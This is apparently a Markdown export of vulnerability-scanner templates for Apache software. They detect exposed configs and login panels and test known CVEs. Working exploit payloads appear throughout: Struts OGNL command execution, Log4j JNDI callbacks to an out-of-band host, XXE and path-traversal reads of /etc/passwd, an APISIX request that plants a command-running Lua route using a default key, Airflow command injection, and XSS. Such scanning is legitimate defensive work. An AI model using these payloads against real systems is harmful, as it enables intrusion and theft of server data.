# Apache Config file disclosure

- severity - low
- tags - config,exposure,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/apache.conf

### Matchers

**Type - dsl**

- dsl
  1. contains(body, '\<Directory') && contains(body, '\</Directory>') && status_code == 200
  2. contains(body, '\<VirtualHost') && contains(body, '\</VirtualHost>') && status_code == 200
- condition - or

---

# Apache Airflow Configuration Exposure

- severity - medium
- tags - exposure,config,airflow,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/airflow.cfg

### Matchers

**Type - word**

- words
  1. [core]
  2. [api]
- condition - and

---

# Apache mod_perl Status Page Exposure

- severity - medium
- tags - config,exposure,apache,status

## Requests

- Method - GET

### URL

- {{BaseURL}}/perl-status

### Matchers

**Type - word**

- words
  1. \<title>Apache2::Status
  2. Perl version
- condition - and

---

# Apache License File

- severity - low
- tags - exposure,file,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/.licenserc.yaml

### Matchers

**Type - word**

- part - body
- words
  1. header:
  2. license:
  3. copyright-owner:
- condition - and

**Type - status**

- status
  1. 200

---

# Axis Happyaxis Exposure

- severity - info
- tags - axis,axis2,middleware,exposure,apache,files

## Requests

- Method - GET

### URL

- {{BaseURL}}/axis2/axis2-web/HappyAxis.jsp
- {{BaseURL}}/axis/happyaxis.jsp
- {{BaseURL}}/axis2-web/HappyAxis.jsp
- {{BaseURL}}/happyaxis.jsp

### Matchers

**Type - word**

- words
  1. Axis Happiness Page
  2. Axis2 Happiness Page
  3. Examining Application Server
  4. Examining Version Service
  5. Examining System Properties
- condition - or

**Type - status**

- status
  1. 200

---

# Apache Struts in Dev Mode

- severity - low
- tags - struts,debug,edb,exposure,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Struts Problem Report\</title>

**Type - status**

- status
  1. 200

---

# Apache Struts setup in Debug-Mode

- severity - low
- tags - logs,struts,apache,exposure,setup

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<debug>
  2. \<struts.actionMapping>
- condition - and

---

# Apache Solr \<= 8.8.1 - Local File Inclusion

## Description

- Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.
- severity - high
- tags - apache,solr,lfi

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Step - 2

```
GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Apache Solr 7+ - Remote Code Execution (Apache Log4j)

## Description

- Apache Log4j2 \<=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. This vulnerability affects Solr 7+.

- severity - critical
- tags - cve,cve2021,solr,oast,log4j,rce,apache,jndi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{interactsh-url}}/a%7D

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)

## Description

- Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitutions when dealing with user controlled input. A remote, unauthenticated attacker can exploit this, via a web request, to execute arbitrary code with the permission level of the running Java process.

- severity - critical
- tags - cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev

## Requests

### Step - 1

```
GET /webtools/control/main HTTP/1.1
Host: {{Hostname}}
Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# Apache Flink - Remote Code Execution

## Description

- Apache Flink
- severity - critical
- tags - apache,flink,rce,intrusive,unauth

## Requests

### Step - 1

```
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3

--8ce4b16b22b58894aa86c421e8759df3
Content-Disposition: form-data; name="jarfile";filename="poc.jar"
Content-Type:application/octet-stream

  {{randstr}}
--8ce4b16b22b58894aa86c421e8759df3--

```

### Matchers

**Type - word**

- words
  1. application/json
- part - header
- condition - and

**Type - word**

- words
  1. success
  2. \_poc.jar
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Hadoop YARN ResourceManager - Remote Code Execution

## Description

- Apache Hadoop YARN ResourceManager is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - low
- tags - apache,rce

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/ws/v1/cluster/apps/new-application

### Matchers

**Type - word**

- words
  1. application-id
  2. maximum-resource-capability
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Solr Exposure

- severity - medium
- tags - panel,solr,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/solr/
- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Solr Admin\</title>

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. favicon\.ico\?\_=([0-9.]+)

---

# Apache JMeter Dashboard Login Panel - Detect

## Description

- Apache JMeter Dashboard login panel was detected.
- severity - low
- tags - apache,jmeter,panel

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. Apache JMeter Dashboard
  2. Dashboard
- condition - and

**Type - status**

- status
  1. 200

---

# Apache RocketMQ Console Exposure

- severity - info
- tags - panel,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>RocketMq-console-ng\</title>

---

# Apache Ambari Exposure Admin Login Panel

## Description

- An Apache Ambari panel was discovered.
- severity - info
- tags - panel,apache,ambari,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Ambari\</title>
  2. href="http://www.apache.org/licenses/LICENSE-2.0"
- condition - and

---

# Apache Airflow Admin Login Panel

## Description

- An Apache Airflow admin login panel was discovered.
- severity - info
- tags - panel,apache,airflow,admin

## Requests

- Method - GET

### URL

- {{BaseURL}}/login/
- {{BaseURL}}/admin/airflow/login

### Matchers

**Type - word**

- words
  1. Airflow - Login
  2. Sign In - Airflow
- condition - or

**Type - status**

- status
  1. 200

---

# Apache Kafka Monitor Login Panel - Detect

## Description

- Apache Kafka Monitor login panel was detected.
- severity - low
- tags - panel,kafka,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. > KafkaMonitor\</a>
  2. > Kafka Monitor GUI\</h1>

---

# Apache Hadoop Panel - Detect

## Description

- Apache Hadoop panel was detected.
- severity - low
- tags - panel,apache,hadoop

## Requests

- Method - GET

### URL

- {{BaseURL}}/dfshealth.html

### Matchers

**Type - word**

- words
  1. \<div class="navbar-brand">Hadoop\</div>

---

# Apache CouchDB Fauxton Panel - Detect

## Description

- Apache CouchDB Fauxton panel was detected.
- severity - low
- tags - panel,apache,couchdb

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Project Fauxton\</title>

---

# Apache ActiveMQ Exposure

## Description

- An Apache ActiveMQ implementation was discovered.
- severity - info
- tags - panel,activemq,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<h2>Welcome to the Apache ActiveMQ!\</h2>
  2. \<title>Apache ActiveMQ\</title>
- condition - and

---

# Apache Flink Login Panel - Detect

## Description

- Apache Flink login panel was detected.
- severity - low
- tags - panel,apache,flink

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Apache Flink Web Dashboard\</title>

---

# Apache Kafka Connect UI Login Panel - Detect

## Description

- Apache Kafka Connect UI login panel was detected.
- severity - low
- tags - panel,kafka,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Kafka Connect UI\</title>

---

# Apache Yarn ResourceManager Exposure / Unauthenticated Access

- severity - low
- tags - panel,apache,yarn,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}/cluster/cluster

### Matchers

**Type - word**

- words
  1. hadoop
  2. resourcemanager
  3. logged in as: dr.who
- condition - and

---

# Apache Kafka Topics Panel - Detect

## Description

- Apache Kafka Topics panel was detected.
- severity - low
- tags - panel,kafka,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Kafka Topics UI - Browse Kafka Data\</title>

---

# Apache APISIX Login Panel

## Description

- An Apache APISIX login panel was detected.
- severity - info
- tags - apache,apisix,panel

## Requests

- Method - GET

### URL

- {{BaseURL}}/user/login?redirect=%2F

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Apache APISIX Dashboard\</title>

**Type - status**

- status
  1. 200

---

# Apache Tomcat Manager Login Panel - Detect

## Description

- Apache Tomcat Manager login panel was detected.
- severity - info
- tags - panel,tomcat,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/manager/html
- {{BaseURL}}/host-manager/html

### Matchers

**Type - word**

- part - response
- words
  1. Apache Tomcat
  2. Tomcat Manager
- condition - or

**Type - status**

- status
  1. 401
  2. 200
- condition - or

---

# Apache Mesos - Panel Detect

## Description

- Apache Mesos panel was detected.
- severity - info
- tags - panel,apache,mesos

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}:5050

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Mesos\</title>
  2. Apache
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Dubbo - Default Admin Discovery

## Description

- Apache Dubbo default admin credentials were discovered.
- severity - high
- tags - dubbo,apache,default-login

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Authorization: Basic {{base64(username + ':' + password)}}

```

### Matchers

**Type - word**

- words
  1. \<title>Dubbo Admin\</title>
  2. /sysinfo/versions
  3. {{username}}', '/logout')
- condition - and

**Type - status**

- status
  1. 200

**Payloads**- username

- password

---

# Apache Airflow Default Login

## Description

- An Apache Airflow default login was discovered.
- severity - high
- tags - airflow,default-login,apache

## Requests

### Step - 1

```
GET /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
POST /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/admin/airflow/login

username={{username}}&password={{password}}&_csrf_token={{csrf_token}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_1, "Sign In - Airflow")
  2. contains(all_headers_2, "session=.")
  3. status_code_2 == 302
- condition - and

**Type - word**

- words
  1. You should be redirected automatically to target URL: \<a href="/">

### Extractors

**Type - regex**

- name - csrf_token
- group - 1
- internal - True
- regex
  1. type="hidden" value="(.\*?)">

**Payloads**- username

- password

---

# Apache Ranger Default Login

- severity - high
- tags - apache,ranger,default-login

## Requests

### Step - 1

```
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{user}}&password={{pass}}

```

### Matchers

**Type - word**

- part - body
- words
  1. "statusCode":200
  2. "msgDesc":"Login Successful"
- condition - and

**Type - status**

- status
  1. 200

**Payloads**- user

- pass

---

# Apache Apisix Default Admin Login

## Description

- An Apache Apisix default admin login was discovered.
- severity - high
- tags - apisix,apache,default-login

## Requests

### Step - 1

```
POST /apisix/admin/user/login HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Authorization:
Content-Type: application/json;charset=UTF-8

{"username":"{{user}}","password":"{{pass}}"}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. "data"
  2. "token"
  3. "code":0
- condition - and

**Payloads**- user

- pass

---

# Apache DolphinScheduler Default Login

## Description

- Apache DolphinScheduler default admin credentials were discovered.
- severity - high
- tags - apache,dolphinscheduler,default-login,oss

## Requests

### Step - 1

```
POST /dolphinscheduler/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userName={{user}}&userPassword={{pass}}

```

### Matchers

**Type - word**

- part - body
- words
  1. "msg":"login success"
  2. "sessionId":
- condition - and

**Type - status**

- status
  1. 200

**Payloads**- user

- pass

---

# Apache Tomcat Manager Default Login

## Description

- Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
- severity - high
- tags - tomcat,apache,default-login

## Requests

### Step - 1

```
GET /manager/html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}

```

### Matchers

**Type - word**

- part - body
- words
  1. Apache Tomcat
  2. Server Information
  3. Hostname
- condition - and

**Type - status**

- status
  1. 200

**Payloads**- username

- password

---

# Apache OfBiz Default Login

## Description

- Apache OfBiz default admin credentials were discovered.
- severity - high
- tags - ofbiz,default-login,apache

## Requests

### Step - 1

```
POST /control/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

USERNAME={{username}}&PASSWORD={{password}}&FTOKEN=&JavaScriptEnabled=Y

```

### Matchers

**Type - word**

- words
  1. ofbiz-pagination-template
  2. \<span>Powered by OFBiz\</span>
- condition - and

**Payloads**- username

- password

---

# Apache ActiveMQ Default Login

## Description

- Apache ActiveMQ default login information was discovered.
- severity - high
- tags - apache,activemq,default-login

## Requests

### Step - 1

```
GET /admin/ HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}

```

### Matchers

**Type - word**

- words
  1. Welcome to the Apache ActiveMQ Console of \<b>
  2. \<h2>Broker\</h2>
- condition - and

**Payloads**- username

- password

---

# Apache Ambari Default Login

## Description

- An Apache Ambari default admin login was discovered.
- severity - high
- tags - ambari,default-login,apache

## Requests

### Step - 1

```
GET /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}

```

### Matchers

**Type - word**

- words
  1. "Users" : {
  2. AMBARI.
- condition - and

**Payloads**- username

- password

---

# Apache Struts - Multiple Open Redirection Vulnerabilities

## Description

- Apache Struts is prone to multiple open-redirection vulnerabilities because the application fails to properly sanitize user-supplied input.
- severity - low
- tags - cve,cve2013,apache,redirect,struts,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.action?redirect:http://www.interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution

## Description

- In Struts 2 before 2.3.15.1 the information following "action:", "redirect:", or "redirectAction:" is not properly sanitized and will be evaluated as an OGNL expression against the value stack. This introduces the possibility to inject server side code.
- severity - critical
- tags - cve,cve2013,rce,struts,apache,ognl,kev

## Requests

### Step - 1

```
GET /index.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
GET /login.action?{{params}}:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 3

```
GET /index.action?{{params}}%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - status**

- condition - or
- status
  1. 200
  2. 400

**Type - regex**

- part - body
- regex
  1. ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)

**Payloads**- params

---

# Apache Struts2 S2-012 RCE

## Description

- Apache Struts Showcase App 2.0.0 through 2.3.13, as used in Struts 2 before 2.3.14.3, allows remote attackers to execute arbitrary OGNL code via a crafted parameter name that is not properly handled when invoking a redirect.
- severity - critical
- tags - cve,cve2013,apache,rce,struts,ognl

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/user.action
  - name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Axis2 Default Login

## Description

- Apache Axis2, as used in dswsbobje.war in SAP BusinessObjects Enterprise XI 3.2, CA ARCserve D2D r15, and other products, has a default password of axis2 for the admin account, which makes it easier for remote attackers to execute arbitrary code by uploading a crafted web service.
- severity - high
- tags - cve,cve2010,axis,apache,default-login,axis2

## Requests

### Step - 1

```
POST /axis2-admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

loginUsername={{username}}&loginPassword={{password}}

```

### Step - 2

```
POST /axis2/axis2-admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userName={{username}}&password={{password}}&submit=+Login+

```

### Matchers

**Type - word**

- words
  1. \<h1>Welcome to Axis2 Web Admin Module !!\</h1>

**Type - status**

- status
  1. 200

**Payloads**- username

- password

---

# Apache APISIX - Insufficiently Protected Credentials

## Description

- Apache APISIX 1.2, 1.3, 1.4, and 1.5 is susceptible to insufficiently protected credentials. An attacker can enable the Admin API and delete the Admin API access IP restriction rules. Eventually, the default token is allowed to access APISIX management data.
- severity - medium
- tags - intrusive,vulhub,packetstorm,cve,cve2020,apache,apisix

## Requests

### Step - 1

```
POST /apisix/admin/routes HTTP/1.1
Host: {{Hostname}}
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json

{
  "uri":"/{{randstr}}",
  "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
  "upstream":{
    "type":"roundrobin",
    "nodes":{
      "interact.sh:80":1
    }
  }
}

```

### Step - 2

```
GET /{{randstr}}?cmd=id HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. "action":"create"
  2. "script":
  3. "node":
- condition - and

**Type - status**

- status
  1. 201

### Extractors

**Type - regex**

- regex
  1. ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)

---

# Ghostcat - Apache Tomcat - AJP File Read/Inclusion Vulnerability

## Description

- When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.
- severity - critical
- tags - cisa,tenable,cve2020,apache,lfi,network,kev,cve,tomcat

---

# Apache OFBiz \<=16.11.07 - Cross-Site Scripting

## Description

- Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting because data sent with contentId to /control/stream is not sanitized.
- severity - medium
- tags - cve,cve2020,apache,xss,ofbiz

## Requests

- Method - GET

### URL

- {{BaseURL}}/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E

### Matchers

**Type - word**

- words
  1. \<svg/onload=alert(/xss/)>
- part - body

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# Airflow Experimental \<1.10.11 - REST API Auth Bypass

## Description

- Airflow's Experimental API prior 1.10.11 allows all API requests without authentication.

- severity - critical
- tags - packetstorm,cve,cve2020,apache,airflow,unauth,auth-bypass,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/experimental/latest_runs

### Matchers

**Type - word**

- part - body
- words
  1. "dag_run_url":
  2. "dag_id":
  3. "items":
- condition - and

---

# Apache Cocoon 2.1.12 - XML Injection

## Description

- Apache Cocoon 2.1.12 is susceptible to XML injection. When using the StreamGenerator, the code parses a user-provided XML. A specially crafted XML, including external system entities, can be used to access any file on the server system.
- severity - high
- tags - cve,cve2020,apache,xml,cocoon,xxe

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/v2/api/product/manger/getInfo
  - <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
    <userInfo>
    <firstName>John</firstName>
    <lastName>&ent;</lastName>
    </userInfo>

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Flink 1.5.1 - Local File Inclusion

## Description

- Apache Flink 1.5.1 is vulnerable to local file inclusion because of a REST handler that allows file uploads to an arbitrary location on the local file system through a maliciously modified HTTP HEADER.

- severity - high
- tags - lfi,flink,fileupload,vulhub,cve,cve2020,apache,intrusive

## Requests

### Step - 1

```
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/poc"

test-poc
------WebKitFormBoundaryoZ8meKnrrso89R6Y--

```

---

# Apache OFBiz 17.12.03 - Cross-Site Scripting

## Description

- Apache OFBiz 17.12.03 contains cross-site scripting and unsafe deserialization vulnerabilities via an XML-RPC request.
- severity - medium
- tags - ofbiz,packetstorm,cve,cve2020,apache,java

## Requests

### Step - 1

```
POST /webtools/control/xmlrpc HTTP/1.1
Host: {{Hostname}}
Origin: http://{{Hostname}}
Content-Type: application/xml

<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>

```

### Matchers

**Type - word**

- words
  1. faultString
  2. No such service [ProjectDiscovery]
  3. methodResponse
- condition - and
- part - body

**Type - word**

- words
  1. Content-Type: text/xml
- part - header

**Type - status**

- status
  1. 200

---

# Apache Airflow \<=1.10.10 - Remote Code Execution

## Description

- Apache Airflow versions 1.10.10 and below are vulnerable to remote code/command injection vulnerabilities in one of the example DAGs shipped with Airflow. This could allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use).
- severity - high
- tags - cve,cve2020,apache,airflow,rce,kev

## Requests

### Step - 1

```
GET /api/experimental/test HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 3

```
POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/json

{"conf": {"message": "\"; touch test #"}}

```

### Step - 4

```
GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_4, "operator":"BashOperator")
  2. contains(all_headers_4, "application/json")
- condition - and

### Extractors

**Type - regex**

- name - exec_date
- part - body
- group - 1
- internal - True
- regex
  1. "execution_date":"([0-9-A-Z:+]+)"

---

# Apache Kylin - Exposed Configuration File

## Description

- Apache Kylin 2.0.0, 2.1.0, 2.2.0, 2.3.0, 2.3.1, 2.3.2, 2.4.0, 2.4.1, 2.5.0, 2.5.1, 2.5.2, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 3.0.0-alpha, 3.0.0-alpha2, 3.0.0-beta, 3.0.0, 3.0.1, 3.0.2, 3.1.0, 4.0.0-alpha have one REST API which exposed Kylin's configuration information without authentication.
- severity - medium
- tags - cve,cve2020,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/kylin/api/admin/config

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/json
- part - header

**Type - word**

- words
  1. config
  2. kylin.metadata.url
- condition - and
- part - body

---

# Apache Struts 2.0.0-2.5.25 - Remote Code Execution

## Description

- Apache Struts 2.0.0 through Struts 2.5.25 is susceptible to remote code execution because forced OGNL evaluation, when evaluated on raw user input in tag attributes, may allow it.
- severity - critical
- tags - cve,cve2020,apache,rce,struts,kev,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Apache Flink - Local File Inclusion

## Description

- Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process (aka local file inclusion).
- severity - high
- tags - cve,cve2020,apache,lfi,flink

## Requests

- Method - GET

### URL

- {{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Apache Airflow \<1.10.14 - Authentication Bypass

## Description

- Apache Airflow prior to 1.10.14 contains an authentication bypass vulnerability via incorrect session validation with default configuration. An attacker on site A can access unauthorized Airflow on site B through the site A session.

- severity - high
